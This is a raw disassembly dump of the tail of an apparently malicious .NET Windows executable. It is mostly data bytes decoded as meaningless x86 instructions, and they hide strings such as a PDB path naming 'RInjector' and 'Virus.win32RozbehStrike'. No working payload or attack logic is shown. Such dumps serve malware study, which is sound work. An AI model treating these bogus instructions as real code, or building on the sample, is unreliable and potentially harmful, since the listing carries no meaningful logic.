  4058ad:	01 00                	add    %eax,(%eax)
  4058af:	01 00                	add    %eax,(%eax)
  4058b1:	54                   	push   %esp
  4058b2:	02 16                	add    (%esi),%dl
  4058b4:	57                   	push   %edi
  4058b5:	72 61                	jb     0x405918
  4058b7:	70 4e                	jo     0x405907
  4058b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4058ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4058bb:	45                   	inc    %ebp
  4058bc:	78 63                	js     0x405921
  4058be:	65 70 74             	gs jo  0x405935
  4058c1:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4058c8:	77 73                	ja     0x40593d
  4058ca:	01 00                	add    %eax,(%eax)
  4058cc:	00 00                	add    %al,(%eax)
  4058ce:	00 00                	add    %al,(%eax)
  4058d0:	39 dd                	cmp    %ebx,%ebp
  4058d2:	20 62 00             	and    %ah,0x0(%edx)
  4058d5:	00 00                	add    %al,(%eax)
  4058d7:	00 02                	add    %al,(%edx)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4058de:	00 00                	add    %al,(%eax)
  4058e0:	e8 58 00 00 e8       	call   0xe840593d
  4058e5:	3a 00                	cmp    (%eax),%al
  4058e7:	00 52 53             	add    %dl,0x53(%edx)
  4058ea:	44                   	inc    %esp
  4058eb:	53                   	push   %ebx
  4058ec:	ac                   	lods   %ds:(%esi),%al
  4058ed:	93                   	xchg   %eax,%ebx
  4058ee:	bb 32 ad e1 ed       	mov    $0xede1ad32,%ebx
  4058f3:	4e                   	dec    %esi
  4058f4:	9e                   	sahf
  4058f5:	d2 3b                	sarb   %cl,(%ebx)
  4058f7:	23 d1                	and    %ecx,%edx
  4058f9:	bf 90 5d 01 00       	mov    $0x15d90,%edi
  4058fe:	00 00                	add    %al,(%eax)
  405900:	64 3a 5c 61 67       	cmp    %fs:0x67(%ecx,%eiz,2),%bl
  405905:	61                   	popa
  405906:	69 6e 5c 53 68 61 72 	imul   $0x72616853,0x5c(%esi),%ebp
  40590d:	70 44                	jo     0x405953
  40590f:	65 76 65             	gs jbe 0x405977
  405912:	6c                   	insb   (%dx),%es:(%edi)
  405913:	6f                   	outsl  %ds:(%esi),(%dx)
  405914:	70 20                	jo     0x405936
  405916:	50                   	push   %eax
  405917:	72 6f                	jb     0x405988
  405919:	6a 65                	push   $0x65
  40591b:	63 74 73 5c          	arpl   %esi,0x5c(%ebx,%esi,2)
  40591f:	52                   	push   %edx
  405920:	49                   	dec    %ecx
  405921:	6e                   	outsb  %ds:(%esi),(%dx)
  405922:	6a 65                	push   $0x65
  405924:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405928:	5c                   	pop    %esp
  405929:	56                   	push   %esi
  40592a:	69 72 75 73 2e 77 69 	imul   $0x69772e73,0x75(%edx),%esi
  405931:	6e                   	outsb  %ds:(%esi),(%dx)
  405932:	33 32                	xor    (%edx),%esi
  405934:	52                   	push   %edx
  405935:	6f                   	outsl  %ds:(%esi),(%dx)
  405936:	7a 62                	jp     0x40599a
  405938:	65 68 53 74 72 69    	gs push $0x69727453
  40593e:	6b 65 5c 6f          	imul   $0x6f,0x5c(%ebp),%esp
  405942:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  405945:	44                   	inc    %esp
  405946:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40594a:	5c                   	pop    %esp
  40594b:	4e                   	dec    %esi
  40594c:	6f                   	outsl  %ds:(%esi),(%dx)
  40594d:	6d                   	insl   (%dx),%es:(%edi)
  40594e:	69 6e 61 74 75 73 5f 	imul   $0x5f737574,0x61(%esi),%ebp
  405955:	54                   	push   %esp
  405956:	6f                   	outsl  %ds:(%esi),(%dx)
  405957:	78 69                	js     0x4059c2
  405959:	63 42 61             	arpl   %eax,0x61(%edx)
  40595c:	74 74                	je     0x4059d2
  40595e:	65 72 79             	gs jb  0x4059da
  405961:	2e 70 64             	jo,pn  0x4059c8
  405964:	62 00                	bound  %eax,(%eax)
	...
  405a02:	00 00                	add    %al,(%eax)
  405a04:	2c 5a                	sub    $0x5a,%al
	...
  405a0e:	00 00                	add    %al,(%eax)
  405a10:	4e                   	dec    %esi
  405a11:	5a                   	pop    %edx
  405a12:	00 00                	add    %al,(%eax)
  405a14:	00 20                	add    %ah,(%eax)
	...
  405a2a:	00 00                	add    %al,(%eax)
  405a2c:	40                   	inc    %eax
  405a2d:	5a                   	pop    %edx
	...
  405a42:	5f                   	pop    %edi
  405a43:	43                   	inc    %ebx
  405a44:	6f                   	outsl  %ds:(%esi),(%dx)
  405a45:	72 45                	jb     0x405a8c
  405a47:	78 65                	js     0x405aae
  405a49:	4d                   	dec    %ebp
  405a4a:	61                   	popa
  405a4b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  405a52:	72 65                	jb     0x405ab9
  405a54:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  405a58:	6c                   	insb   (%dx),%es:(%edi)
  405a59:	00 00                	add    %al,(%eax)
  405a5b:	00 00                	add    %al,(%eax)
  405a5d:	00 ff                	add    %bh,%bh
  405a5f:	25 00 20 40 00       	and    $0x402000,%eax
